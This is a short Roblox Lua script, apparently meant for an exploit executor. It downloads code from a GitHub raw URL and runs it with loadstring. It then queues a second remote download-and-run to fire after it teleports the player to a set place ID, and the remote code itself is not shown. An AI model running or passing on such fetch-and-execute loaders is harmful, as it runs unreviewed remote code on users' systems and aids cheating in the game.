loadstring(game:HttpGet("https://raw.githubusercontent.com/selfabsorbed/Roblox-Scripts/refs/heads/main/a"))()

queue_on_teleport([[
    queue_on_teleport([=[
        if not game:IsLoaded() then game.Loaded:Wait() end
        loadstring(game:HttpGet(\"https://raw.githubusercontent.com/selfabsorbed/Roblox-Scripts/refs/heads/main/b\"))()
    ]=])
]])
game:GetService("TeleportService"):Teleport(11170059897)
